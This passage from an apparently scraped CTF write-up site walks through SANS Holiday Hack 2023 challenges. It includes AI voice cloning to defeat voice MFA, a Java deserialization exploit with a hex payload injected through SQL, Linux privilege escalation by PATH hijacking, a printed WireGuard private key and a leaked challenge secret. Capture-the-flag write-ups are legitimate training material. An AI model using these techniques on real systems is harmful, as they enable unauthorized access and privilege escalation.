The interval in milliseconds. Adjust as needed.\n}\n\n// Lock the player's health at a specific value, e.g., 100\nlockPlayerHealth(100);\n</code></pre> This script is actually not written by me. The secret is to feed ChatGPT with Java codes and then ask it to write you a Java script that runs in developer console that does what you need it to do.</p> <p>There are more than one way to complete this challenge. </p>"},{"location":"objectives/o2/#images","title":"Images","text":"<p>Answer</p> <p>Insert the answer to the objective here.</p>"},{"location":"objectives/o2/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>You're like a snowball fighting ninja! A real-life legend. Can I have your autograph!?</p>"},{"location":"objectives/o20/","title":"Space Island Door Access Speaker","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o20/#objective","title":"Objective","text":"<p>Request</p> <p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information.</p> Jewel Loggins (Spaceport Point) <p>What are you doing here, and who are you?</p> <p>Me first? I'm Jewel Loggins. And I was trekking through the jungle and happened to find this place.</p> <p>I liked this spot and decided to set up camp. Seeing you here is quite the surprise.</p> <p>Well, because the only other person I've ever seen come here is Wombley Cube.</p> <p>I thought this tram station in the middle of the jungle was strange to begin with, but then Wombley added to the intrigue.</p> <p>I guess all this spy stuff is typical for him, so maybe I shouldn't think much of it. I'm sure everything's fine.</p> <p>Every time he comes here, he says something to the speaker. Then, the door opens, and he rides the tram somewhere.</p> <p>I gave it a try, but the door didn't open for me. Knowing Wombley, it's some kind of secret passphrase.</p> <p>If you wanna see where the tram goes, I think you need to find out what that passphrase is.</p> <p>Ribb Bonbowford over at Coggoggle Marina on Steampunk Island works with Wombley. Try asking if he knows.</p> <p>I hope you find it. I'll be here when you get back!</p> <p>What, you know the passphrase!? Let me try it!</p> <p>Nope, didn't work. Knowing Wombley, the passphrase isn't the only requirement. He's all about that MFA!</p> <p>Oh yeah, multi-factor authentication! The passphrase for something he knows, and his voice for something he is!</p> <p>That's it! You need to be Wombley. You need his voice. Now, how are you gonna get that?</p> <p>Since only us elves can get a subscription to use ChatNPT, try searching for another AI tool that can simulate voices. I'm sure there's one out there.</p>"},{"location":"objectives/o20/#hints","title":"Hints","text":"MFA: Something You Are <p>It seems the Access Speaker is programmed to only accept Wombley's voice. Maybe you could get a sample of his voice and use an AI tool to simulate Wombley speaking the passphrase. </p> MFA: Something You Know <p>Wombley says a specific phrase into the Access Speaker. He works in the Research Department and everything they do it super secret, so it may be a challenge to find out what the phrase is. Ribb also works in that department. Try to find and ask him.</p>"},{"location":"objectives/o20/#solution","title":"Solution","text":"<p>The audio sample wombleycube_the_enchanted_voyage.mp3 can be download from:  <pre><code>https://www.holidayhackchallenge.com/2023/wombleycube_the_enchanted_voyage.mp3.zip\n</code></pre></p> <p>You can find Wombley @ Film Noir Island:</p> <p></p> <p>You can get the link by speak to Wombley Cube at Noir island - Chiaroscuro City. </p> <p>We need to complete the Active Directory challenge to get the secret passphrease. </p> <p>Now we have \u201csomething Wombley knows\u201d and \u201csomething Wombleyhas\u201d. </p> <p>A free voice cloning can do the job: <code>https://play.ht/studio/voice-cloning</code></p> <p>Just download the fake voice MP3 and played it to the door. </p> <p>Pretty scary how easy we can fake other people\u2019s voice. </p> <p></p> <p>Answer</p> <p>Wombley says:  And he whispered, 'Now I shall be out of sight; So through the valley and over the height.' And he'll silently take his way.</p>"},{"location":"objectives/o20/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Are you like a master spy or something? I've only seen stuff like that in the movies!</p> <p>It sure is scary what you can do with AI, huh?  I sure hope ChatNPT has better guardrails in place. </p>"},{"location":"objectives/o21/","title":"Camera Access","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o21/#objective","title":"Objective","text":"<p>Request</p> <p>Gain access to Jack's camera. What's the third item on Jack's TODO list? </p> Wombley Cube <p>Wombley Cube's original dialogue is lost in space and time. However, he/she thinks the system is safe and you will never be able to  access the camera! Show him/her what you are capable of. </p>"},{"location":"objectives/o21/#hints","title":"Hints","text":"Hubris is a Virtue <p>In his hubris, Wombley revealed that he thinks you won't be able to access the satellite's \"Supervisor Directory\". There must be a good reason he mentioned that specifically, and a way to access it. He also said there's someone else masterminding the whole plot. There must be a way to discover who that is using the nanosat.</p> Insert Hint 2 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o21/#solution","title":"Solution","text":"<p>This document on NanoSta provide a good reference:  https://diglib.tugraz.at/download.php?id=5c80eb780bab6&amp;location=browse</p> <p>Also the lock note speak is a good starting point:</p> <p>First, open the Gator terminal and ask she/he to perform a time travelling. </p> <p></p> <p>We want to copy the client config information for later use with docker application.</p> <pre><code>[Interface]\nAddress = 10.1.1.2/24\nPrivateKey = 7KyIa/2bjOtnmqauKY9U2zewsI2YDYHdphyj8PLJs1I=\nListenPort = 51820\n[Peer]\nPublicKey = regufluqxIKS1//QImnqgcIL+TIhokM37++iI0/sOgU=\nEndpoint = 34.31.116.236:51820\nAllowedIPs = 10.1.1.1/32\n</code></pre> <p>Then download the North Pole VNC Workspace Container from the \"NanoSat-o-Matic\" on the left of Gator terminal. We want to fire up the docker app with the following command within the folder:</p> <p><code>sudo bash ./build_and_run.sh</code></p> <p>Open the Wireguard VPN client config file and copy the client config information from Gator terminal.  <code>sudo nano /etc/wireguard/wg0.conf</code> Save it and fire up the WireGuard VPN:  <code>wg-quick down wg0</code> <code>wg-quick up wg0</code></p> <p>Use any VPN client you like to connect to the NanoSta framework at:  <code>127.0.0.1:5900</code> I used <code>vinagre</code> Once in Nanosta, right click, choose Satellite Tools and NanoSat MO Base Station Tool.</p> <p>Then access the camera directory using consumer testing tool at:  <code>maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory</code> Then click Fetch Information. Choose Camera, click \"connect to selected Provider\" In Apps Launcher service Tab, choose Camera tab and click \"runApp\". to launch camera. </p> <p>Then follow the same way to access Camera as you access \"nanosat-mo-supervisor-Directory\"</p> <p>In Communication Settings (Directory), put the following URL in Directory Service URI:</p> <p><code>maltcp://10.1.1.1:1025/camera-Directory</code> Choose Action, fetch information and click \"connect to selected Provider\". </p> <p>Choose Action service Tab, and select name \"Base64Snapimage\" and click \"SubmitAction\" button. You can \"edit\" what you submitted and then click Submit.  Then we can see the submission result by switch to Parameter service Tab and click \"getValue\". </p> <p>We will use those actions frequently throughout following challenges, so I will not go into details for every action but just state \"submit\" what \"values\" via \"camera\" service for brevity. </p> <p>Open a wireshark by right click the desktop and start to capture packets. In \u201cAction service\u201d submitAction of image capture, then go to \u201cparameter service\u201d and click getValue. Then stop Wireshark packet capture and saved it to /root. </p> <p>Copy the saved pcap file to current dir: <code>sudo docker cp &lt;container_ID&gt;:/root/ .</code>. We can get the container ID by: <code>sudo docker ps -q</code> Then we can open this pcap file via wireshark. </p> <p>Then I asked chatGPT on how to capture malTCP: How to search packets related to \"maltcp://10.1.1.1:1025/camera-Archive\" in Wireshark? The answer is:  <code>ip.addr == 10.1.1.1 &amp;&amp; tcp.port == 1025</code> Right click the TCP packet and select follow \uf0e0 TCP Stream. Once tons of packets are loaded, copy everything into a packet.dat file and decoded it to a jpeg image: </p> <p><code>tr -d '\\n' &lt; packet.dat | base64 -d &gt; image.jpeg</code> Open the jpeg file: </p> <p></p> <p>Can you see the third item on Jack's TODO list? It's behind him.  We need to save Christmas from Jack's evil plan! Jack is a insider threat. </p>"},{"location":"objectives/o21/#images","title":"Images","text":"<p>Answer</p> <p>Conquer holiday season! </p>"},{"location":"objectives/o21/#response","title":"Response","text":"<p>Wombley Cube</p> <p>Wombley Cube knows about Jack's revolt, but he/she thinks Jack is right. She/he think there is nothing you can do to stop Jack from destroy Christmas! Prove she/he is wrong! </p>"},{"location":"objectives/o22/","title":"Missile Diversion","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o22/#objective","title":"Objective","text":"<p>Request</p> <p>Thwart Jack's evil plan by re-aiming his missile at the Sun. </p> Wombley Cube <p>Wombley thinks you are a Saboteur </p>"},{"location":"objectives/o22/#hints","title":"Hints","text":"Always Lock Your Computer <p>Wombley thinks he may have left the admin tools open. I should check for those if I get stuck.</p>"},{"location":"objectives/o22/#solution","title":"Solution","text":"<p>Gator is your friend in this challenge. She/he will help you re-set the server by \"time travelling\" if you mess something up in the server. </p> <p>Now we can launch the Missle-targeting-system same way as we launch the Camera: </p> <p>We then log into the Missle-targeting-system at address: </p> <p><code>maltcp://10.1.1.1:1026/missile-targeting-system-Directory</code></p> <p>In Action service, we submitAction for Debug action. Under Parameter service, we can observe PointingMode, X and Y coordinates and Debug, 4 strings. </p> <p></p> <p>From debug, we know the database (DB) is of Maria DB, do we need to do some SQL injections to solve this challenges? </p> <p>We know <code>VERSION{}: 11.2.20-MariaDB-1:11.2.2+Maria~ubu2204</code> is response from: <code>SELECT VERSION();</code></p> <p>We can use:  <code>; show grants</code> </p> <p>From the response, we can observe that we have SELECT permission on majority of DBs, but not UPDATE privilege on pointing_mode, which is the table we want to manipulate to change the sta from pointing the earth to pointing the sun! The target_coordinate will automatically change if we change the pointing_mode. But how? We need to enumerate more tables and columns: </p> <p>We fire up Wireshark and use submitAction and put the following SQL query into parameters and then submit. We switch to Parameter service and click Get Value on Debug parameters.</p> <pre><code>; SELECT * FROM `missile_targeting_system`.`satellite_query`\n</code></pre> <p>Then we save the PCAP file and view it as previously in Camera Access challenge with:</p> <p><code>ip.addr == 10.1.1.1 &amp;&amp; tcp.port == 1025</code></p> <p>And follow TCP stream: </p> <p></p> <p><pre><code>jid: 1 | object: ........sr..SatelliteQueryFileFolderUtility.......................Z..isQueryZ..isUpdateL..pathOrStatementt..Ljava/lang/String;xp..t.)/opt/SatelliteQueryFileFolderUtility.java | results: import java.io.Serializable;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.*;\nimport java.util.stream.Collectors;\nimport java.util.stream.Stream;\nimport java.sql.*;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport com.google.gson.Gson;\n\npublic class SatelliteQueryFileFolderUtility implements Serializable {\n    private String pathOrStatement;\n    private boolean isQuery;\n    private boolean isUpdate;\n\n    public SatelliteQueryFileFolderUtility(String pathOrStatement, boolean isQuery, boolean isUpdate) {\n        this.pathOrStatement = pathOrStatement;\n        this.isQuery = isQuery;\n        this.isUpdate = isUpdate;\n    }\n\n    public String getResults(Connection connection) {\n        if (isQuery &amp;&amp; connection != null) {\n            if (!isUpdate) {\n                try (PreparedStatement selectStmt = connection.prepareStatement(pathOrStatement);\n                    ResultSet rs = selectStmt.executeQuery()) {\n                    List&lt;HashMap&lt;String, String&gt;&gt; rows = new ArrayList&lt;&gt;();\n                    while(rs.next()) {\n                        HashMap&lt;String, String&gt; row = new HashMap&lt;&gt;();\n                        for (int i = 1; i &lt;= rs.getMetaData().getColumnCount(); i++) {\n                            String key = rs.getMetaData().getColumnName(i);\n                            String value = rs.getString(i);\n                            row.put(key, value);\n                        }\n                        rows.add(row);\n                    }\n                    Gson gson = new Gson();\n                    String json = gson.toJson(rows);\n                    return json;\n                } catch (SQLException sqle) {\n                    return \"SQL Error: \" + sqle.toString();\n                }\n            } else {\n                try (PreparedStatement pstmt = connection.prepareStatement(pathOrStatement)) {\n                    pstmt.executeUpdate();\n                    return \"SQL Update completed.\";\n                } catch (SQLException sqle) {\n                    return \"SQL Error: \" + sqle.toString();\n                }\n            }\n        } else {\n            Path path = Paths.get(pathOrStatement);\n            try {\n                if (Files.notExists(path)) {\n                    return \"Path does not exist.\";\n                } else if (Files.isDirectory(path)) {\n                    // Use try-with-resources to ensure the stream is closed after use\n                    try (Stream&lt;Path&gt; walk = Files.walk(path, 1)) { // depth set to 1 to list only immediate contents\n                        return walk.skip(1) // skip the directory itself\n                                .map(p -&gt; Files.isDirectory(p) ? \"D: \" + p.getFileName() : \"F: \" + p.getFileName())\n                                .collect(Collectors.joining(\"\\n\"));\n                    }\n                } else {\n                    // Assume it's a readable file\n                    return new String(Files.readAllBytes(path), StandardCharsets.UTF_8);\n                }\n            } catch (IOException e) {\n                return \"Error reading path: \" + e.toString();\n            }\n        }\n    }\n\n    public String getpathOrStatement() {\n        return pathOrStatement;\n    }\n}\n</code></pre> The response with jid = 1 contains a serialized Java object class. It indicates a vulnerability of DB namely \"Remote Code Execution via Java Deserialization of Stored Database Objects\" (Deserialization of Untrusted Data), if you rememebr from Reportinator challenge, section-3. </p> <p>We only need to change the constructor and send the binary as hexdecimal values to the server via SQL injection. The server will deserialized the object and update the values. The Java class will execute the SQL query we passed on. </p> <p>Let\u2019s try some enumerations: </p> <pre><code>-- To select all data from the pointing_mode table\n; SELECT * FROM `missile_targeting_system`.`pointing_mode`\n\nReturn: id: 1 | numerical_mode: 0 |\n</code></pre> <pre><code>-- To select all data from the messaging table\n; SELECT * FROM `missile_targeting_system`.`messaging`\n</code></pre> <p></p> <pre><code>-- To select all data from the target_coordinates table\n; SELECT * FROM `missile_targeting_system`.`target_coordinates`\n\nReturn values: | id: 1 | lat: 1.14514 | lng: -145.262 | \n</code></pre> <p><pre><code>-- To select all data from the pointing_mode_to_str table\n; SELECT * FROM `missile_targeting_system`.`pointing_mode_to_str`\n</code></pre> </p> <pre><code>; SELECT * FROM `missile_targeting_system`.`satellite_query`\n; SHOW COLUMNS FROM missile_targeting_system.satellite_query;\n; DESCRIBE missile_targeting_system.satellite_query;\n</code></pre> <p></p> <p>We now can deduce the following UPDATE command we want to execute to update the pointing_mode: </p> <p><code>; UPDATE `missile_targeting_system`.`pointing_mode` SET `numerical_mode` = 1 WHERE `id` = 1</code></p> <p>Query via Debug submitAction was denied with no surprise. </p> <p>I asked ChatGPT to write me a Java script. </p> <p>Prompt:  <pre><code>Our DB: missile_targeting_system\nOur Table: pointing_mode\nColumns: id, numerical_mode\n\nIn this CTF the server can deserialize any object inserted into the object column. Can you craft a serializable object that will update the pointing mode \"; UPDATE `missile_targeting_system`.`pointing_mode` SET `numerical_mode` = 1 WHERE `id` = 1\"?\n</code></pre></p> <pre><code>How to INSERT the \u201cserialized object data\u201d to the table satellite_query in database missile targeting_system? We also need to use UNHEX() to make sure it was decoded when the server received it. \n</code></pre> <p>We now have working Java script: </p> Just Java Code<pre><code>import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutputStream;\n\npublic class SerializeExploit {\n    public static void main(String[] args) {\n        SatelliteQueryFileFolderUtility exploitObject = new SatelliteQueryFileFolderUtility(\n            \"UPDATE `missile_targeting_system`.`pointing_mode` SET `numerical_mode` = 1 WHERE `id` = 1;\",\n            true,\n            true\n        );\n\n        try {\n            // Serialize the object to a byte array\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            ObjectOutputStream oos = new ObjectOutputStream(baos);\n            oos.writeObject(exploitObject);\n            oos.close();\n\n            // Convert the byte array to a hex string\n            byte[] byteArray = baos.toByteArray();\n            String hexString = bytesToHex(byteArray);\n            System.out.println(hexString);\n\n        } catch (IOException i) {\n            i.printStackTrace();\n        }\n    }\n\n    // Helper method to convert byte array to hex string\n    private static String bytesToHex(byte[] bytes) {\n        StringBuilder hex = new StringBuilder();\n        for (byte b : bytes) {\n            hex.append(String.format(\"%02X\", b));\n        }\n        return hex.toString();\n    }\n}\n</code></pre> <p>We can name it as <code>SerializeExploit</code> and compile it with the Java class:  <pre><code>javac SerializeExploit.java -cp \".:gson-2.8.0.jar\"\n</code></pre> Run it:  <pre><code>java -cp \".:gson-2.8.0.jar\" SerializeExploit\n</code></pre> We get a hex string. We attach the hex string to our SQL commands: </p> <pre><code>; INSERT INTO missile_targeting_system.satellite_query (jid, object, results) VALUES (7, UNHEX('ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B7870010174005A55504441544520606D697373696C655F746172676574696E675F73797374656D602E60706F696E74696E675F6D6F6465602053455420606E756D65726963616C5F6D6F646560203D20312057484552452060696460203D20313B'), ' ');\n</code></pre> <p>We can send this SQL command by click submitAction on Debug row and select Edit and put the command as AttributeValue value and click submit. </p> <p>After submission, we can check whether our command has been inserted by query object:  <pre><code>; SELECT results FROM missile_targeting_system.satellite_query;\n; SELECT object FROM missile_targeting_system.satellite_query;\n</code></pre> And we can check if the pointing_mode is point to the sun by: </p> <p><pre><code>; SELECT * FROM `missile_targeting_system`.`pointing_mode`\n</code></pre> If we see <code>numerical_mode = 1</code> from the Parameter service --&gt; Debug --&gt; getValue , it means we have successfully disrupted Jack's evil plan. Well done you! </p> <p>Yes! We got it, now the satellite is aiming at the sun. We can click the camera to the right of Gator to watch a short video. </p> <p></p> <p>Answer</p> <p>You saved Christmas! </p>"},{"location":"objectives/o22/#response","title":"Response","text":"<p>Wombley Cube</p> <p>A... missile... aimed for Santa's sleigh? I had no idea...  I can't believe I was manipulated like this. I've been trained to recognize these kinds of tactics! Santa should never have put the holiday season at risk like he did, but I didn't know Jack's true intentions. I'll help you bring Jack to justice... But my mission to ensure Santa never again compromises the holidays is still in progress. It sounded like the satellite crashed. Based on the coordinates, looks like the crash site is right near Rudolph's Rest.  Use the door to the right to return to the resort lobby and see what happened! Don't worry, I'll meet you there... trust me.</p>"},{"location":"objectives/o3/","title":"Linux 101","text":"<p>Difficulty:  Direct link: Objective 3 terminal</p>"},{"location":"objectives/o3/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.</p> Ginger Breddie <p>Hey, welcome to Santa's Surf Shack on tropical Christmas Island! I'm just hanging ten here, taking it easy while brushing up on my Linux skills. You ever tried getting into Linux? It's a super cool way to play around with computers. Can you believe ChatNPT suggested this trip to the Geese Islands this year? I'm so thrilled! Kudos to ChatNPT, eh? The sunshine, the waves, and my surfboard \u2013 simply loving it! So, what do you have planned? Care to join me in a Linux session?</p>"},{"location":"objectives/o3/#hints","title":"Hints","text":"Insert Hint 1 Title <p>Along the way you will receive different hints. Insert them here.</p> Insert Hint 2 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o3/#solution","title":"Solution","text":"<p>Open the terminal and follow the steps to key in the commands: </p> Linux terminal<pre><code>ls -ls\n\ngrep -ine \"troll\" troll_19315479765589239\n\nrm troll_19315479765589239\n\npwd\n\nls -la\n\nhistory | grep -ie \"troll\"\n\nenv\n\ncd workshop\n\ngrep -ie \"troll\" ./*\n\n/workshop$ chmod +x ./present_engine\nelf@c9be6456d57a:~/workshop$ ./present_engine\ntroll.898906189498077\n\n/home/elf/workshop/electrical\n\nmv blown_fuse0 fuse0\n\nln -s fuse0 fuse1\n\ncp fuse1 fuse2\n\necho \"TROLL_REPELLENT\" &gt;&gt; fuse2\n\nfind /opt/troll_den -iname \"*troll*\"\n\nfind /opt/troll_den -user troll\n\nfind /opt/troll_den -size +108k -size -110k\n\nelf@c9be6456d57a:~/workshop/electrical$ ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\ninit           1  0.0  0.0  20112 16568 pts/0    Ss+  16:20   0:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysession.yaml\nelf         7167  2.6  0.0  31520 26740 pts/2    S+   16:32   0:00 /usr/bin/python3 /14516_troll\nelf         7221  0.0  0.0   7672  3380 pts/3    R+   16:32   0:00 ps aux\nelf@c9be6456d57a:~/workshop/electrical$ netstat -antup\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN      7167/python3        \nelf@c9be6456d57a:~/workshop/electrical$ curl 0.0.0.0:54321\ntroll.73180338045875elf@c9be6456d57a:~/workshop/electrical$ ps aux | grep -ie \"14516_troll\"\nelf         7167  0.1  0.0 105616 27408 pts/2    S+   16:32   0:00 /usr/bin/python3 /14516_troll\nelf         8153  0.0  0.0   5220   732 pts/3    S+   16:33   0:00 grep --color=auto -ie 14516_troll\nelf@c9be6456d57a:~/workshop/electrical$ kill 7167\n</code></pre>"},{"location":"objectives/o3/#images","title":"Images","text":"<p>Answer</p> <p>Insert the answer to the objective here.</p>"},{"location":"objectives/o3/#response","title":"Response","text":"<p>Ginger Breddie</p> <p>Wow, if your surfing skills are as good as your Linux skills, you could be winning competitions!</p>"},{"location":"objectives/o4/","title":"Reportinator","text":"<p>Difficulty:  Direct link: Objective 4 website</p>"},{"location":"objectives/o4/#objective","title":"Objective","text":"<p>Request</p> <p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up.</p> Noel Boetie <p>Copy the first part of the conversation with Elf Name here You can use <code>&lt;br/&gt;</code> to ensure each sentence starts on a new line.</p>"},{"location":"objectives/o4/#hints","title":"Hints","text":"Insert Hint 1 Title <p>Along the way you will receive different hints. Insert them here.</p> Insert Hint 2 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o4/#solution","title":"Solution","text":"<p>ChatGPT prompt: Identify any errors or inconsistencies in the penetration test findings report, and explain why and how. The trick to using AI to find errors here is to feed it short paragraphs. ChatGPT tends to be less effective when given a large chunk of data.</p> <p>No.3: By intercepting HTTP request traffic on 88555/TCP, malicious actors can exploit this vulnerability by crafting and submitting specially serialized objects that can lead to remote code execution upon deserialization. The maximum port number is: 65536</p> <p>No.6: HTTP SEND (should be POST? )</p> <p>No.9: When given an HTTP 7.4.33 (wrong, HTTP 1.0, 1.1 or 2) request</p>"},{"location":"objectives/o4/#admonitions","title":"Admonitions","text":"<p>Anchor the decorations</p> <p>Ensure that all festive decorations, especially electrical ones, are securely anchored. We don\u2019t want them floating off into the tropical sunset!</p> <p>Palm tree lighting</p> <p>While on the island, make sure to hang your Christmas lights on a palm tree. It\u2019s not only festive but also a great beacon for Santa to find you!</p>"},{"location":"objectives/o4/#images","title":"Images","text":""},{"location":"objectives/o4/#response","title":"Response","text":"<p>Noel Boetie</p> <p>Great job on completing that challenge! Ever thought about how your newfound skills might come into play later on? Keep that mind sharp, and remember, today's victories are tomorrow's strategies!</p>"},{"location":"objectives/o5/","title":"Azure 101","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o5/#objective","title":"Objective","text":"<p>Request</p> <p>Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.</p> Sparkle Redberry <p>Hey, Sparkle Redberry here! So, I've been trying to learn about Azure and the Azure CLI and it's driving me nuts. Alabaster Snowball decided to use Azure to host some of his fancy new IT stuff on Geese Islands, and now us elves have to learn it too. Anyway, I know it's important and everyone says it's not as difficult as it seems, but honestly it still feels like quite a challenge for me. Alabaster sent us this Azure CLI reference as well. It's super handy, he said. Honestly, it just confuses me even more. If you can spare a moment, would you mind giving me a hand with this terminal? I'd be really grateful! Pretty please, with holly leaves on top!</p>"},{"location":"objectives/o5/#hints","title":"Hints","text":"Azure CLI Reference <p>The Azure CLI tools come with a builtin help system, but Microsoft also provides this handy cheatsheet.</p>"},{"location":"objectives/o5/#solution","title":"Solution","text":"<p>Your will need the following site:  https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest</p> <p>https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token</p> <p><pre><code>az help | less \n\naz account show | less\n\naz group list\n\naz functionapp list --resource-group northpole-rg1 | less\n\naz vm list --resource-group northpole-rg2 --output table | less\n\naz vm run-command invoke --resource-group northpole-rg2 --name NP-VM1 --command-id RunShellScript --scripts \"ls\"\n\n{\n  \"value\": [\n    {\n      \"code\": \"ComponentStatus/StdOut/succeeded\",\n      \"displayStatus\": \"Provisioning succeeded\",\n      \"level\": \"Info\",\n      \"message\": \"bin\\netc\\nhome\\njinglebells\\nlib\\nlib64\\nusr\\n\",\n      \"time\": 1702073715\n    },\n    {\n      \"code\": \"ComponentStatus/StdErr/succeeded\",\n      \"displayStatus\": \"Provisioning succeeded\",\n      \"level\": \"Info\",\n      \"message\": \"\",\n      \"time\": 1702073715\n    }\n  ]\n}\n</code></pre> After this challenge, you can now work on SSH challenge since completing this challenge will give you hint on SSH challenge. </p>"},{"location":"objectives/o5/#images","title":"Images","text":""},{"location":"objectives/o5/#response","title":"Response","text":"<p>Sparkle Redberry</p> <p>Wow, you did it! It makes quite a bit more sense to me now. Thank you so much! That Azure Function App URL you came across in the terminal looked interesting. It might be part of that new project Alabaster has been working on with the help of ChatNPT. Let me tell you, since he started using ChatNPT he's been introducing a lot of amazing innovation across the islands. Knowing Alabaster, he'll be delighted to tell you all about it! I think I last saw him on Pixel island. By the way, as part of the Azure documentation he sent the elves, Alabaster also noted that if Azure CLI tools aren't available in an Azure VM we should use the Azure REST API instead. I'm not really sure what that means, but I guess I know what I'll be studying up on next.</p>"},{"location":"objectives/o6/","title":"Luggage Lock","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o6/#objective","title":"Objective","text":"<p>Request</p> <p>Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials</p> Garland Candlesticks <p>Hey there, I'm Garland Candlesticks! I could really use your help with something. You see, I have this important pamphlet in my luggage, but I just can't remember the combination to open it! Chris Elgee gave a talk recently that might help me with this problem. Did you attend that? I seem to recall Chris mentioning a technique to figure out the combinations... I have faith in you! We'll get that luggage open in no time. This pamphlet is crucial for me, so I can't thank you enough for your assistance. Once we retrieve it, I promise to treat you to a frosty snack on me!</p>"},{"location":"objectives/o6/#hints","title":"Hints","text":"Lock Talk <p>Check out Chris Elgee's talk regarding his and his wife's luggage. Sounds weird but interesting!</p>"},{"location":"objectives/o6/#solution","title":"Solution","text":"<p>We need to slowly apply pressure to the key pad, and then rorate the number from left to right, we stop when we met with resistance and turn the next number. We press the key pad through until every number has resistance. There is a video that explain this better than my words do.  <code>https://www.youtube.com/watch?v=ycM1hBSEyog</code></p>"},{"location":"objectives/o6/#images","title":"Images","text":""},{"location":"objectives/o6/#response","title":"Response","text":"<p>Garland Candlesticks</p> <p>Wow, you did it! I knew you could crack the code. Thank you so much!</p>"},{"location":"objectives/o7/","title":"Linux PrivEsc","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o7/#objective","title":"Objective","text":"<p>Request</p> <p>Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.</p> Rose Mold (Ostrich Saloon) <p>In a digital winter wonderland we play, Where elves and bytes in harmony lay. This festive terminal is clear and bright, Escalate privileges, and bring forth the light.</p> <p>Start in the land of bash, where you reside, But to win this game, to root you must glide. Climb the ladder, permissions to seize, Unravel the mystery, with elegance and ease.</p> <p>There lies a gift, in the root's domain, An executable file to run, the prize you'll obtain. The game is won, the challenge complete, Merry Christmas to all, and to all, a root feat!</p>"},{"location":"objectives/o7/#hints","title":"Hints","text":"Linux Privilege Escalation Techniques <p>There's various ways to escalate privileges on a Linux system.</p> Linux Command Injection <p>Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.</p>"},{"location":"objectives/o7/#solution","title":"Solution","text":"<p>This is my first attempt, hit a wall.  <pre><code>sed -i 's/^elf:x:1000:1000::\\/home\\/elf:/elf:x:1000:1000:root:\\/root:/' passwd1\n\nelf@795c35ce2d2c:/usr/bin$ simplecopy /root/* /home/elf/\n\nsimplecopy \"$LFILE\" /dev/stdout &gt; newrun\n\nLFILE=/root/runmetoanswer\n\nelf@de8289623969:/tmp$ chmod +x newrun\nelf@de8289623969:/tmp$ newrun\nbash: newrun: command not found\nelf@de8289623969:/tmp$ ./newrun\n\nSomething went wrong reading the configuration file /etc/runtoanswer.yaml: Couldn't open file: Permission denied (os error 13)\n\nIf this persists, please ask for help!\n\nelf@de8289623969:/tmp$ cat runtoanswer1.yaml \n# This is the config file for runtoanswer, where you can set up your challenge!\n---\n\n# This is the completionSecret from the Content sheet - don't tell the user this!\nkey: b08b538569e395f88e12ef9fe751ac39\n\n# The answer that the user is expected to enter - case sensitive\n# (This is optional - if you don't have an answer, then running this will immediately win)\nanswer: \"santa\"\n\ntext: |\n  Who delivers Christmas presents?\n\nsuccess_message: \"Your answer is *correct*!\"\nfailure_message: \"Sorry, that answer is *incorrect*. Please try again!\"\n\n# A prompt that is displayed if the user runs this interactively (they might\n# not see this - answers can be entered as an argument)\nprompt: \"&gt; \"\n\n# Optional: a time, in seconds, to delay before validating the answer (to\n# prevent guessing)\ndelay: 1\n\n# Optional: skip (most) stdout output if the answer is correct\nheadless: false\n\n# If set to true, don't exit after the user asks\nkeep_going: false\n\n# Optional: play this sound on completion or failure\n#completion_sound: 'myhappysound.mp3'\n#failure_sound: 'mysadsound.mp3'\n\n# Close the terminal when it is completed?\n</code></pre> Then I used another way, find a method to escalate privileges inside this terminal and then run the binary in /root </p> <pre><code>strings simple copy\n\nenv\n\n/usr/local/sbin/cp is the priority of $PATH environment variable. \n\nsimplecopy /usr/bin/bash /usr/local/sbin/cp\n\nelf@d5e39028f5f3:~$ 